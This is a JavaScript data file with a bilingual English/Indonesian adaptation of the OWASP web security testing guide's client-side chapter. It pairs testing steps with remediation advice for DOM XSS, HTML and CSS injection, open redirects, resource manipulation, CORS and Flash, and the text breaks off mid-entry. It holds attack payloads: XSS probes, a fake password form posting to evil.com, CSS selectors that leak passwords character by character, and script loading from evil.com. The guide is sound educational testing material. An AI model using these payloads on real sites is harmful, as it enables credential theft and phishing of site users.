/* WSTG Bilingual — 4.11 Client-side (15 tests)
   Condensed bilingual adaptation, CC BY-SA 4.0. Registers: t=Teknis, b=Baku, s=Sederhana. */
window.WSTG_DATA = window.WSTG_DATA || [];
window.WSTG_DATA.push({
  order: 11, code: 'CLNT',
  name_en: 'Client-side',
  desc_en: 'DOM XSS, CORS, clickjacking, WebSockets & storage',
  name_id: { t: 'Client-side', b: 'Sisi Klien', s: 'Serangan di Browser' },
  desc_id: { t: 'DOM XSS, CORS, clickjacking, WebSocket & browser storage', b: 'XSS berbasis DOM, CORS, pembajakan klik, WebSocket, dan penyimpanan peramban', s: 'Celah yang jalan langsung di browser: XSS DOM, CORS, klik palsu, WebSocket, dan localStorage' },
  tests: [

    {
      name_en: 'Testing for DOM-Based Cross Site Scripting',
      name_id: { t: 'Pengujian Cross-Site Scripting Berbasis DOM (DOM-Based XSS)', b: 'Pengujian XSS Berbasis DOM', s: 'XSS di Dalam Halaman' },
      summary: {
        en: 'DOM XSS happens when client-side scripts write attacker-controlled data into dangerous sinks like document.write or innerHTML without sanitization. The payload never touches the server, so server-side filters are blind to it.',
        t: 'DOM XSS terjadi saat script client-side menulis data yang dikontrol penyerang ke sink berbahaya seperti document.write atau innerHTML tanpa sanitasi. Payload tidak pernah menyentuh server, sehingga filter sisi server tidak melihatnya.',
        b: 'XSS berbasis DOM terjadi ketika skrip sisi klien menulis data yang dikendalikan penyerang ke titik muat berbahaya seperti document.write atau innerHTML tanpa sanitasi. Muatan serangan tidak pernah menyentuh peladen, sehingga penyaring sisi peladen tidak dapat melihatnya.',
        s: 'XSS ini jalan murni di browser — JavaScript situsnya sendiri yang nulis input kita ke halaman tanpa pemeriksaan. Filter di server jadi nggak ngaruh sama sekali.'
      },
      howto: {
        en: [
          'Crawl all JS with a DOM XSS scanner or grep for sinks: `document.write`, `innerHTML`, `eval`, `location.hash`, `document.location`, `setTimeout` with string args.',
          'Trace sources to sinks: check whether `location.hash`, `location.search`, `postMessage`, or `document.referrer` flow into those sinks.',
          'Inject a probe into each source: `http://target.com/#<img src=x onerror=alert(1)>` and observe the page.',
          'For sink-based confirmation use `document.write` breakouts like `\"><svg/onload=alert(1)>` in URL fragments or parameters.',
          'Verify execution in browser dev tools console; check alert fires without any server interaction.'
        ],
        t: [
          'Crawl semua JS dengan scanner DOM XSS atau grep untuk sink: `document.write`, `innerHTML`, `eval`, `location.hash`, `document.location`, `setTimeout` dengan argumen string.',
          'Telusuri source ke sink: cek apakah `location.hash`, `location.search`, `postMessage`, atau `document.referrer` mengalir ke sink tersebut.',
          'Injeksikan probe ke setiap source: `http://target.com/#<img src=x onerror=alert(1)>` dan amati halamannya.',
          'Untuk konfirmasi berbasis sink, gunakan breakout pada `document.write` seperti `\"><svg/onload=alert(1)>` di fragment URL atau parameter.',
          'Verifikasi eksekusi di console browser dev tools; pastikan alert terpicu tanpa interaksi server.'
        ],
        b: [
          'Jelajahi seluruh skrip dengan pemindai XSS DOM atau telusuri titik muat: `document.write`, `innerHTML`, `eval`, `location.hash`, `document.location`, `setTimeout` dengan argumen untai.',
          'Telusuri sumber ke titik muat: periksa apakah `location.hash`, `location.search`, `postMessage`, atau `document.referrer` mengalir ke titik muat tersebut.',
          'Suntikkan probe ke setiap sumber: `http://target.com/#<img src=x onerror=alert(1)>` dan amati halamannya.',
          'Untuk konfirmasi berbasis titik muat, gunakan pemisah pada `document.write` seperti `\"><svg/onload=alert(1)>` pada fragmen URL atau parameter.',
          'Pastikan eksekusi di konsol peramban; pastikan alert terpicu tanpa interaksi peladen.'
        ],
        s: [
          'Cari di file JavaScript-nya kata-kata `document.write`, `innerHTML`, `eval`, `location.hash` — itu "lubang" tempat input ditulis ke halaman.',
          'Lihat dari mana datanya: `location.hash` (bagian URL setelah tanda #), `location.search` (setelah ?), atau `postMessage`.',
          'Coba buka `target.com/#<img src=x onerror=alert(1)>` — kalau muncul alert, berarti bocor.',
          'Kalau nggak jalan, variasi payload: `\"><svg onload=alert(1)>` — kadang perlu menutup tag atau kutip dulu.',
          'Buka Console (F12) buat lihat error — kadang payload gagal karena karakter diblokir, pesan error nunjukin alasannya.'
        ]
      },
      tools: ['Burp Suite (Engagement Tools)', 'browser dev tools', 'Semgrep', 'DOM Invader'],
      remediation: {
        en: 'Avoid dangerous sinks entirely: use textContent instead of innerHTML, never eval untrusted strings. Framework escaping (Angular, React) helps, but validate and sanitize any data crossing from source to sink.',
        t: 'Hindari sink berbahaya sepenuhnya: gunakan textContent alih-alih innerHTML, dan jangan pernah eval string yang tidak dipercaya. Escaping framework (Angular, React) membantu, tetapi validasi dan sanitasi setiap data yang melintas dari source ke sink.',
        b: 'Hindari titik muat berbahaya sepenuhnya: gunakan textContent alih-alih innerHTML, dan jangan pernah mengevaluasi untai yang tidak dipercaya. Pengamanan bawaan kerangka kerja (Angular, React) membantu, namun tetap validasi dan sanitasi setiap data yang melintas dari sumber ke titik muat.',
        s: 'Jangan pakai `innerHTML` atau `eval` buat nulis data dari URL — pakai `textContent`. Kalau terpaksa pakai, bersihkan dulu inputnya. Framework modern udah bantu, tapi jangan ngandalin itu doang.'
      }
    },

    {
      name_en: 'Testing for JavaScript Execution',
      name_id: { t: 'Pengujian Eksekusi JavaScript', b: 'Pengujian Eksekusi Skrip JavaScript', s: 'Menyusupkan Script ke Halaman' },
      summary: {
        en: 'Test whether injected JavaScript actually executes in the page context — beyond reflection, you need code running. Script tags, event handlers, and JavaScript URIs are the classic vectors.',
        t: 'Uji apakah JavaScript yang diinjeksikan benar-benar tereksekusi dalam konteks halaman — lebih dari sekadar refleksi, Anda butuh kode yang berjalan. Tag script, event handler, dan URI JavaScript adalah vektor klasiknya.',
        b: 'Uji apakah JavaScript yang disuntikkan benar-benar tereksekusi dalam konteks halaman — lebih dari sekadar pantulan, kode harus benar-benar berjalan. Tag skrip, penangan peristiwa, dan URI JavaScript adalah vektor klasiknya.',
        s: 'Bukan cuma nulis teks di halaman — kita mau kode kita beneran jalan. Ada banyak cara: tag script, event handler kayak onclick, atau alamat javascript:.'
      },
      howto: {
        en: [
          'Inject a script tag into each input that lands in HTML: `<script>alert(1)</script>` and observe execution.',
          'Try event handlers where tags are filtered: `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`, `<div onmouseover=alert(1)>`.',
          'Test JavaScript URIs in link href parameters: `<a href="javascript:alert(1)">click</a>`.',
          'Exploit reflected values in existing script blocks by breaking out: `\\\';alert(1);//`.',
          'Confirm execution context with `alert(document.domain)` to prove same-origin code execution.'
        ],
        t: [
          'Injeksikan tag script ke setiap input yang mendarat di HTML: `<script>alert(1)</script>` dan amati eksekusinya.',
          'Coba event handler di tempat tag difilter: `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`, `<div onmouseover=alert(1)>`.',
          'Uji URI JavaScript pada parameter href link: `<a href="javascript:alert(1)">klik</a>`.',
          'Eksploitasi nilai refleksi di blok script yang ada dengan breakout: `\\\';alert(1);//`.',
          'Konfirmasi konteks eksekusi dengan `alert(document.domain)` untuk membuktikan code execution same-origin.'
        ],
        b: [
          'Suntikkan tag skrip ke setiap masukan yang mendarat di HTML: `<script>alert(1)</script>` dan amati eksekusinya.',
          'Coba penangan peristiwa di tempat tag tersaring: `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`, `<div onmouseover=alert(1)>`.',
          'Uji URI JavaScript pada parameter href tautan: `<a href="javascript:alert(1)">klik</a>`.',
          'Manfaatkan nilai pantulan dalam blok skrip yang ada dengan memisah keluar: `\\\';alert(1);//`.',
          'Konfirmasi konteks eksekusi dengan `alert(document.domain)` untuk membuktikan eksekusi kode se-asal-situs.'
        ],
        s: [
          'Tempel `<script>alert(1)</script>` di setiap form dan URL — kalau alert muncul, menang.',
          'Kalau tag script diblokir, pakai event handler: `<img src=x onerror=alert(1)>` — img yang error tetap ngejalanin onerror.',
          'Coba juga `javascript:alert(1)` di tempat link — kadang lolos.',
          'Kalau input kita masuk ke dalam kode JavaScript situsnya, tutup kutipnya dulu: `\\\';alert(1);//`.',
          'Tutup dengan `alert(document.domain)` — ini bukti kode kita jalan di domain target, bukan di tempat lain.'
        ]
      },
      tools: ['Burp Suite', 'browser dev tools', 'XSStrike', 'OWASP ZAP'],
      remediation: {
        en: 'Encode output for the exact context it lands in (HTML body, attribute, JS string), use CSP as a second layer, and never place untrusted input inside script blocks or event handler positions.',
        t: 'Encode output sesuai konteks persis tempat ia mendarat (body HTML, attribute, string JS), gunakan CSP sebagai lapisan kedua, dan jangan pernah menempatkan input tidak dipercaya di dalam blok script atau posisi event handler.',
        b: 'Enkode keluaran sesuai konteks persis tempatnya mendarat (isi HTML, atribut, untai JavaScript), gunakan CSP sebagai lapisan kedua, dan jangan pernah menempatkan masukan yang tidak dipercaya di dalam blok skrip atau posisi penangan peristiwa.',
        s: 'Bersihkan output sesuai tempatnya nongol — di dalam tag, di attribute, atau di dalam kode JS beda perlakuannya. Tambahin CSP sebagai tameng kedua, dan jangan pernah naruh input orang di dalam blok script.'
      }
    },

    {
      name_en: 'Testing for HTML Injection',
      name_id: { t: 'Pengujian HTML Injection', b: 'Pengujian Penyuntikan HTML', s: 'Menyusupkan HTML Palsu' },
      summary: {
        en: 'HTML injection plants attacker-controlled markup into the page — fake login forms, defacement, or phishing content rendered inside the trusted origin. It may or may not allow script execution, but it always breaks trust.',
        t: 'HTML injection menanam markup yang dikontrol penyerang ke halaman — form login palsu, defacement, atau konten phishing yang dirender di dalam origin tepercaya. Bisa saja tidak memungkinkan eksekusi script, tetapi selalu merusak kepercayaan.',
        b: 'Penyuntikan HTML menanam markup yang dikendalikan penyerang ke halaman — formulir login palsu, perusakan tampilan, atau konten pishing yang tampil di dalam asal situs yang tepercaya. Mungkin tidak memungkinkan eksekusi skrip, namun selalu merusak kepercayaan.',
        s: 'Kita nembusin HTML buatan sendiri ke halaman situs — bikin form login palsu atau tampilan nyaris sama aslinya. Korban nggak sadar lagi di halaman bajingan.'
      },
      howto: {
        en: [
          'Inject benign markup first: `<h1>test</h1>` and `<b>bold</b>` to see if tags render rather than display as text.',
          'If rendered, escalate to structure: `<form action="http://evil.com"><input type=password>` to fake a login form.',
          'Test attribute injection contexts: `" onfocus=alert(1) autofocus="` when your input lands inside a tag attribute.',
          'Check email and profile fields, error messages, and page titles for persistent HTML injection.',
          'Demonstrate impact: inject a fake password capture form and document it — stored HTML injection is a serious finding.'
        ],
        t: [
          'Injeksikan markup jinak dulu: `<h1>test</h1>` dan `<b>bold</b>` untuk melihat apakah tag dirender, bukan ditampilkan sebagai teks.',
          'Jika dirender, eskalasi ke struktur: `<form action="http://evil.com"><input type=password>` untuk memalsukan form login.',
          'Uji konteks injeksi attribute: `" onfocus=alert(1) autofocus="` saat input Anda mendarat di dalam attribute tag.',
          'Cek field email dan profil, pesan error, serta judul halaman untuk HTML injection persisten.',
          'Tunjukkan dampak: injeksikan form penangkap password palsu dan dokumentasikan — stored HTML injection adalah temuan serius.'
        ],
        b: [
          'Suntikkan markup jinak terlebih dahulu: `<h1>uji</h1>` dan `<b>tebal</b>` untuk melihat apakah tag dirender alih-alih ditampilkan sebagai teks.',
          'Bila dirender, tingkatkan ke struktur: `<form action="http://evil.com"><input type=password>` untuk memalsukan formulir login.',
          'Uji konteks suntikan atribut: `" onfocus=alert(1) autofocus="` ketika masukan Anda mendarat di dalam atribut tag.',
          'Periksa kolom surel dan profil, pesan galat, serta judul halaman untuk penyuntikan HTML persisten.',
          'Tunjukkan dampaknya: suntikkan formulir penangkap kata sandi palsu dan dokumentasikan — penyuntikan HTML tersimpan adalah temuan serius.'
        ],
        s: [
          'Coba dulu `<h1>test</h1>` — kalau tulisannya jadi besar, berarti HTML kita diproses.',
          'Kalau lolos, naik level: buat form login palsu yang ngirim password ke server kita — itu bukti dampak terkuat.',
          'Kalau input kita nyangkut di dalam attribute tag (kayak value="..."), tutup kutipnya: `" onfocus=alert(1) autofocus="`.',
          'Cek tempat yang sering lupa: nama profil, pesan error, judul halaman.',
          'Dokumentasikan dengan tangkapan layar — form password palsu di situs asli itu temuan berat.'
        ]
      },
      tools: ['Burp Suite', 'browser dev tools', 'OWASP ZAP'],
      remediation: {
        en: 'HTML-encode all untrusted output before it reaches the page, use auto-escaping template engines, and validate input against a strict whitelist of allowed characters.',
        t: 'HTML-encode semua output tidak dipercaya sebelum mencapai halaman, gunakan template engine dengan auto-escaping, dan validasi input terhadap whitelist karakter yang ketat.',
        b: 'Enkode-HTML seluruh keluaran yang tidak dipercaya sebelum mencapai halaman, gunakan mesin templat dengan pengamanan otomatis, dan validasi masukan terhadap daftar putih karakter yang ketat.',
        s: 'Semua input dari user harus di-encode sebelum ditulis ke halangan — jadi `<` berubah jadi `&lt;`. Pakai template engine yang otomatis, dan filter karakter aneh dari awal.'
      }
    },

    {
      name_en: 'Testing for Client-side URL Redirect',
      name_id: { t: 'Pengujian URL Redirect Sisi Client', b: 'Pengujian Pengalihan URL di Sisi Klien', s: 'Pengalihan Halaman yang Bisa Dimanipulasi' },
      summary: {
        en: 'Client-side redirects driven by user input (location.hash, query params) can be abused to bounce victims to attacker-controlled sites. This powers phishing with a trusted domain in the first hop.',
        t: 'Redirect sisi client yang digerakkan input user (location.hash, parameter query) dapat disalahgunakan untuk melempar korban ke situs yang dikontrol penyerang. Ini menjadi senjata phishing dengan domain tepercaya di lompatan pertama.',
        b: 'Pengalihan di sisi klien yang digerakkan masukan pengguna (location.hash, parameter kueri) dapat disalahgunakan untuk melempar korban ke situs yang dikendalikan penyerang. Ini menjadi senjata pishing dengan domain tepercaya pada lompatan pertama.',
        s: 'Situsnya nerima alamat dari URL terus otomatis pindah halaman ke situ. Kita bisa isi alamat jahat — korban lihat domain asli dulu, baru ditarik ke situs palsu.'
      },
      howto: {
        en: [
          'Map every script that reads redirect parameters: grep for `location.href=`, `location.assign(`, `location.replace(`, `window.open(`.',
          'Feed external URLs into each redirect parameter: `http://target.com/redirect?url=http://evil.com` and `?next=//evil.com`.',
          'Try protocol-relative and encoded payloads: `//evil.com`, `%2F%2Fevil.com`, `https:evil.com` to bypass naive validation.',
          'Test fragment-based redirects: `http://target.com/#http://evil.com` where JS parses location.hash.',
          'Verify the browser actually lands on the external site, and note whether the redirect is instant or requires a user click.'
        ],
        t: [
          'Petakan setiap script yang membaca parameter redirect: grep untuk `location.href=`, `location.assign(`, `location.replace(`, `window.open(`.',
          'Masukkan URL eksternal ke setiap parameter redirect: `http://target.com/redirect?url=http://evil.com` dan `?next=//evil.com`.',
          'Coba payload protocol-relative dan terenkode: `//evil.com`, `%2F%2Fevil.com`, `https:evil.com` untuk melewati validasi naif.',
          'Uji redirect berbasis fragment: `http://target.com/#http://evil.com` di mana JS mem-parsing location.hash.',
          'Pastikan browser benar-benar mendarat di situs eksternal, dan catat apakah redirect instan atau membutuhkan klik user.'
        ],
        b: [
          'Petakan setiap skrip yang membaca parameter pengalihan: telusuri `location.href=`, `location.assign(`, `location.replace(`, `window.open(`.',
          'Masukkan URL eksternal ke setiap parameter pengalihan: `http://target.com/redirect?url=http://evil.com` dan `?next=//evil.com`.',
          'Coba muatan relatif-protokol dan terenkode: `//evil.com`, `%2F%2Fevil.com`, `https:evil.com` untuk melewati validasi sederhana.',
          'Uji pengalihan berbasis fragmen: `http://target.com/#http://evil.com` pada kasus skrip mengurai location.hash.',
          'Pastikan peramban benar-benar mendarat di situs eksternal, dan catat apakah pengalihan terjadi langsung atau memerlukan klik pengguna.'
        ],
        s: [
          'Cari di JavaScript-nya: `location.href=`, `location.replace(` — itu kode pemindah halaman.',
          'Coba `target.com/redirect?url=http://evil.com` — ganti evil.com dengan situs kamu sendiri (yang aman, kayak halaman tes).',
          'Validasi sering bisa dibohongin: pakai `//evil.com` atau versi terenkode kayak `%2F%2Fevil.com`.',
          'Jangan lupa cek bagian setelah tanda #: `target.com/#http://evil.com` — sering lupa dicek.',
          'Catat: langsung pindah atau harus klik dulu? Itu beda tingkat bahaya buat laporan.'
        ]
      },
      tools: ['Burp Suite', 'browser dev tools', 'curl'],
      remediation: {
        en: 'Never build redirects from user input. Where a redirect parameter is unavoidable, validate against a strict allowlist of internal paths and reject absolute URLs outright.',
        t: 'Jangan pernah membangun redirect dari input user. Bila parameter redirect tidak terhindarkan, validasi terhadap allowlist ketat path internal dan tolak URL absolut secara langsung.',
        b: 'Jangan pernah membangun pengalihan dari masukan pengguna. Bila parameter pengalihan tidak terhindarkan, validasi terhadap daftar putih ketat jalur internal dan tolak URL absolut secara tegas.',
        s: 'Jangan bikin fitur pindah halaman dari input URL. Kalau terpaksa ada (kayak tombol "lanjut ke dashboard"), cuma izinin path internal — alamat luar langsung ditolak.'
      }
    },

    {
      name_en: 'Testing for CSS Injection',
      name_id: { t: 'Pengujian CSS Injection', b: 'Pengujian Penyuntikan CSS', s: 'Menyusupkan CSS ke Halaman' },
      summary: {
        en: 'Injected CSS can deface a page, exfiltrate data via attribute selectors, or hijack UI by overlaying fake elements. Modern CSS is powerful enough to steal sensitive values character by character.',
        t: 'CSS yang diinjeksikan dapat mendeface halaman, mengeksfiltrasi data via attribute selector, atau membajak UI dengan overlay elemen palsu. CSS modern cukup kuat untuk mencuri nilai sensitif karakter demi karakter.',
        b: 'CSS yang disuntikkan dapat merusak tampilan halaman, membocorkan data melalui pemilih atribut, atau membajak antarmuka dengan menumpangkan elemen palsu. CSS modern cukup kuat untuk mencuri nilai sensitif karakter demi karakter.',
        s: 'CSS bukan cuma bikin halaman jadi jelek — CSS yang nyusup bisa ngebanjur form password di atas yang asli, atau nyuri data dikit demi dikit lewat trik selector.'
      },
      howto: {
        en: [
          'Inject style breakouts where input lands in style contexts: `"></style><style>body{background:url(http://evil.com)}` to escape a style block.',
          'Test attribute-based exfiltration: `input[value^="a"]{background:url(log?a)}` to leak a password character by character.',
          'Test UI hijacking: overlay a fake element on a login form with absolute positioning and z-index.',
          'Check style parameters: `?theme=dark` or customizable profile CSS fields for unfiltered injection.',
          'Note that CSP with style-src restrictions limits but does not eliminate attribute-selector exfiltration.'
        ],
        t: [
          'Injeksikan breakout style di mana input mendarat dalam konteks style: `"></style><style>body{background:url(http://evil.com)}` untuk keluar dari blok style.',
          'Uji eksfiltrasi berbasis attribute: `input[value^="a"]{background:url(log?a)}` untuk membocorkan karakter password satu per satu.',
          'Uji pembajakan UI: overlay elemen palsu di atas form login dengan absolute positioning dan z-index.',
          'Cek parameter style: `?theme=dark` atau field CSS profil yang dapat dikustomisasi untuk injeksi tanpa filter.',
          'Perhatikan bahwa CSP dengan restriksi style-src membatasi namun tidak menghilangkan eksfiltrasi attribute-selector.'
        ],
        b: [
          'Suntikkan pemisah gaya ketika masukan mendarat dalam konteks gaya: `"></style><style>body{background:url(http://evil.com)}` untuk keluar dari blok gaya.',
          'Uji pembocoran berbasis atribut: `input[value^="a"]{background:url(log?a)}` untuk membocorkan karakter kata sandi satu per satu.',
          'Uji pembajakan antarmuka: tumpangkan elemen palsu di atas formulir login dengan penempatan absolut dan z-index.',
          'Periksa parameter gaya: `?theme=dark` atau kolom CSS profil yang dapat disesuaikan untuk suntikan tanpa saringan.',
          'Perhatikan bahwa CSP dengan pembatasan style-src membatasi namun tidak menghilangkan pembocoran lewat pemilih atribut.'
        ],
        s: [
          'Kalau input kita nyangkut di dalam blok CSS, tutup dulu bloknya: `"></style><style>...` — habis itu bebas nulis CSS apa aja.',
          'Trik nyuri data: `input[value^="a"]{background:url(log?a)}` — CSS "nanya" satu-satu huruf password, jawabannya dikirim lewat request background.',
          'Bikin elemen palsu numpang di atas form login — korban ngetik password di tempat kita.',
          'Cek fitur tema atau CSS kustom profil — sering lupa difilter.',
          'CSP bisa bantu ngebatasi, tapi trik nyuri per karakter biasanya masih jalan.'
        ]
      },
      tools: ['browser dev tools', 'Burp Suite'],
      remediation: {
        en: 'Never allow raw CSS from users. Validate custom styles against a whitelist of safe properties, sanitize style attribute values, and apply a CSP with style-src nonces.',
        t: 'Jangan pernah mengizinkan CSS mentah dari user. Validasi style kustom terhadap whitelist properti yang aman, sanitasi nilai attribute style, dan terapkan CSP dengan nonce pada style-src.',
        b: 'Jangan pernah membiarkan CSS mentah berasal dari pengguna. Gaya kustom harus divalidasi terhadap daftar putih properti yang aman, nilai atribut gaya disanitasi, dan CSP dengan nonce diterapkan pada style-src.',
        s: 'Jangan terima CSS mentah dari user. Kalau emang butuh fitur kustom, cuma izinin properti yang aman (kayak warna), dan pasang CSP buat ngebatasi sisanya.'
      }
    },

    {
      name_en: 'Testing for Client-side Resource Manipulation',
      name_id: { t: 'Pengujian Manipulasi Resource Sisi Client', b: 'Pengujian Manipulasi Sumber Daya di Sisi Klien', s: 'Mengubah Alat yang Dipakai Halaman' },
      summary: {
        en: 'If script URLs, stylesheet paths, or other resource references are derived from user input, attackers can swap them for hostile resources — loading attacker JS into the trusted page.',
        t: 'Jika URL script, path stylesheet, atau referensi resource lain diturunkan dari input user, penyerang dapat menukarnya dengan resource musuh — memuat JS penyerang ke halaman tepercaya.',
        b: 'Jika URL skrip, jalur lembar gaya, atau rujukan sumber daya lain diturunkan dari masukan pengguna, penyerang dapat menukarnya dengan sumber daya miliknya — memuat skrip penyerang ke halaman tepercaya.',
        s: 'Situs kadang ngambil alamat script atau CSS dari parameter URL. Kalau begitu, kita tukar alamatnya dengan punya kita — JavaScript kita jalan di halaman target.'
      },
      howto: {
        en: [
          'Map resource-loading parameters: `?js=`, `?lib=`, `?theme=`, `?cdn=` in script src and link href attributes.',
          'Point the parameter at a controlled resource: `http://target.com/?lib=http://evil.com/x.js` and watch the network tab for the fetch.',
          'Test path traversal to load unintended local files: `?lib=../../admin/secret.js`.',
          'Check postMessage and WebSocket-driven resource loading — dynamic loaders often trust pushed URLs.',
          'If an external resource loads and executes in the page origin, you have full script execution.'
        ],
        t: [
          'Petakan parameter pemuat resource: `?js=`, `?lib=`, `?theme=`, `?cdn=` pada attribute src script dan href link.',
          'Arahkan parameter ke resource yang Anda kontrol: `http://target.com/?lib=http://evil.com/x.js` dan amati tab network untuk fetch tersebut.',
          'Uji path traversal untuk memuat file lokal yang tidak dimaksudkan: `?lib=../../admin/secret.js`.',
          'Periksa pemuatan resource yang digerakkan postMessage dan WebSocket — loader dinamis sering mempercayai URL yang didorong masuk.',
          'Jika resource eksternal termuat dan tereksekusi dalam origin halaman, Anda memiliki full script execution.'
        ],
        b: [
          'Petakan parameter pemuatan sumber daya: `?js=`, `?lib=`, `?theme=`, `?cdn=` pada atribut src skrip dan href tautan.',
          'Arahkan parameter ke sumber daya milik Anda: `http://target.com/?lib=http://evil.com/x.js` dan amati tab jaringan untuk pengambilan tersebut.',
          'Uji penelusuran jalur untuk memuat berkas lokal yang tidak dimaksudkan: `?lib=../../admin/secret.js`.',
          'Periksa pemuatan sumber daya yang digerakkan postMessage dan WebSocket — pemuat dinamis sering mempercayai URL yang didorong masuk.',
          'Jika sumber daya eksternal termuat dan tereksekusi dalam asal halaman, Anda memperoleh eksekusi skrip penuh.'
        ],
        s: [
          'Cari parameter kayak `?js=`, `?lib=`, `?theme=` di URL — cek di source halaman apakah dipakai buat alamat script.',
          'Ganti isinya dengan alamat file JavaScript milikmu, buka tab Network (F12) — kalau ada request ke alamatmu, berarti kena.',
          'Coba juga jalan mundur: `?lib=../../admin/secret.js` — kadang bisa muat file internal.',
          'Cek juga yang digerakin postMessage atau WebSocket — kode pemuat dinamis sering percaya URL yang dikirim masuk.',
          'Kalau script kita termuat dan jalan di domain target, itu sama kayaknya XSS penuh.'
        ]
      },
      tools: ['browser dev tools', 'Burp Suite'],
      remediation: {
        en: 'Hardcode resource URLs or resolve them from a server-side map keyed by short identifiers. Never pass full URLs from the client into script src or link href.',
        t: 'Hardcode URL resource atau resolusi dari map sisi server yang dikunci identifier pendek. Jangan pernah meneruskan URL penuh dari client ke src script atau href link.',
        b: 'Tetapkan URL sumber daya secara tetap atau selesaikan dari pemetaan sisi peladen yang dikunci pengenal singkat. Jangan pernah meneruskan URL lengkap dari klien ke src skrip atau href tautan.',
        s: 'Alamat script dan CSS harus ditulis mati di server, bukan diambil dari URL. Kalau emang butuh pilihan tema, pakai kode pendek kayak `dark`/`light` yang diterjemahkan server.'
      }
    },

    {
      name_en: 'Testing for Cross Origin Resource Sharing',
      name_id: { t: 'Pengujian Cross Origin Resource Sharing (CORS)', b: 'Pengujian Berbagi Sumber Daya Lintas Asal (CORS)', s: 'Uji Izin Antarsitus (CORS)' },
      summary: {
        en: 'CORS misconfiguration lets any origin read authenticated responses. Test whether the server reflects arbitrary origins, allows null, or trusts subdomains — each is a data theft primitive.',
        t: 'Misconfiguration CORS memungkinkan origin mana pun membaca response yang terautentikasi. Uji apakah server merefleksikan origin arbitrer, mengizinkan null, atau mempercayai subdomain — masing-masing adalah primitif pencurian data.',
        b: 'Salah konfigurasi CORS memungkinkan asal mana pun membaca respons yang terautentikasi. Uji apakah peladen memantulkan asal sebarang, mengizinkan null, atau mempercayai subdomain — masing-masing adalah dasar pencurian data.',
        s: 'CORS itu aturan situs soal boleh nggak domain lain baca datanya. Kalau setelannya salah, situs mana aja bisa nyuri data user kita yang lagi login.'
      },
      howto: {
        en: [
          'Send requests with hostile origins: `curl -H "Origin: https://evil.com" -i https://target.com/api/user` and inspect `Access-Control-Allow-Origin`.',
          'Test origin reflection: if the response echoes `Access-Control-Allow-Origin: https://evil.com` with `Access-Control-Allow-Credentials: true`, any site can read authenticated data.',
          'Test the null origin: `curl -H "Origin: null" -i https://target.com/api/user` — sandboxed iframes send null, and some servers allow it.',
          'Test subdomain trust: Origin from a compromised sibling like `https://blog.target.com` may be whitelisted by wildcard-matching bugs.',
          'Write a PoC page that fetches an authenticated endpoint cross-origin with credentials and renders the response.'
        ],
        t: [
          'Kirim request dengan origin musuh: `curl -H "Origin: https://evil.com" -i https://target.com/api/user` dan periksa `Access-Control-Allow-Origin`.',
          'Uji refleksi origin: bila response meng-echo `Access-Control-Allow-Origin: https://evil.com` dengan `Access-Control-Allow-Credentials: true`, situs mana pun dapat membaca data terautentikasi.',
          'Uji origin null: `curl -H "Origin: null" -i https://target.com/api/user` — iframe sandbox mengirim null, dan sebagian server mengizinkannya.',
          'Uji kepercayaan subdomain: Origin dari sibling yang terkompromi seperti `https://blog.target.com` mungkin masuk whitelist karena bug pencocokan wildcard.',
          'Buat halaman PoC yang melakukan fetch ke endpoint terautentikasi lintas-origin dengan credentials dan merender responsenya.'
        ],
        b: [
          'Kirim permintaan dengan asal musuh: `curl -H "Origin: https://evil.com" -i https://target.com/api/user` dan periksa `Access-Control-Allow-Origin`.',
          'Uji pantulan asal: bila respons menggemakan `Access-Control-Allow-Origin: https://evil.com` disertai `Access-Control-Allow-Credentials: true`, situs mana pun dapat membaca data terautentikasi.',
          'Uji asal null: `curl -H "Origin: null" -i https://target.com/api/user` — iframe bersandbox mengirim null, dan sebagian peladen mengizinkannya.',
          'Uji kepercayaan subdomain: asal dari domain seinduk yang tersusupi seperti `https://blog.target.com` mungkin masuk daftar putih karena kecacatan pencocokan wildcard.',
          'Buat halaman PoC yang mengambil endpoint terautentikasi lintas asal dengan kredensial dan menampilkan responsenya.'
        ],
        s: [
          'Kirim request kayak gini: `curl -H "Origin: https://evil.com" -i https://target.com/api/user` — lihat header `Access-Control-Allow-Origin` di balasan.',
          'Kalau balisannya ng-echo alamat evil.com DAN ada `Access-Control-Allow-Credentials: true` — itu bahaya besar, situs mana aja bisa baca data user yang login.',
          'Coba juga `Origin: null` — aneh tapi banyak server ngizinin.',
          'Cek subdomain lain kayak `blog.target.com` — kadang wildcardnya kegedean, subdomain yang bocor ikut dipercaya.',
          'Bikin file HTML kecil buat proof: dia fetch data user lewat browser korban dan nampilin hasil curiannya.'
        ]
      },
      tools: ['curl', 'Burp Suite', 'browser dev tools'],
      remediation: {
        en: 'Whitelist exact trusted origins server-side, never reflect arbitrary origins with credentials enabled, and never use a wildcard together with Access-Control-Allow-Credentials.',
        t: 'Whitelist origin tepercaya secara persis di sisi server, jangan pernah merefleksikan origin arbitrer dengan credentials aktif, dan jangan pernah menggunakan wildcard bersama Access-Control-Allow-Credentials.',
        b: 'Daftarkan asal tepercaya secara persis di sisi peladen, jangan pernah memantulkan asal sebarang dengan kredensial aktif, dan jangan pernah memakai wildcard bersama Access-Control-Allow-Credentials.',
        s: 'Cuma izinin domain temen yang beneran dipercaya — ditulis lengkap satu-satu, bukan wildcard. Yang paling fatal: `*` plus izin bawa cookie — jangan pernah.'
      }
    },

    {
      name_en: 'Testing for Cross Site Flashing',
      name_id: { t: 'Pengujian Cross Site Flashing', b: 'Pengujian Penyalaan Lintas Situs (Flash)', s: 'Uji Celah Flash & Plugin Lama' },
      summary: {
        en: 'Legacy Flash/Silverlight content and its parameters can be abused for XSS, data theft, or same-origin bypass. Flash is dead in modern browsers, but embedded players and plugin-driven content still merit a check.',
        t: 'Konten Flash/Silverlight legacy dan parameternya dapat disalahgunakan untuk XSS, pencurian data, atau bypass same-origin. Flash sudah mati di browser modern, tetapi player tersemat dan konten berbasis plugin masih layak diperiksa.',
        b: 'Konten Flash/Silverlight lama dan parameternya dapat disalahgunakan untuk XSS, pencurian data, atau penghindaran kebijakan asal-sama. Flash telah berakhir di peramban modern, namun pemutar tersemat dan konten berbasis plugin masih layak diperiksa.',
        s: 'Flash udah mati, tapi kalau situs masih nyimpen file SWF lama atau konten plugin, tetap harus dicek — dia pernah jadi pintu XSS dan curi data yang gede.'
      },
      howto: {
        en: [
          'Enumerate plugin content: grep page source for `.swf`, `application/x-shockwave-flash`, `.xap`, and `object`/`embed` tags.',
          'Test SWF parameters: inject `FlashVars` values like `<img src=x onerror=alert(1)>` into embed src or flashvars attributes.',
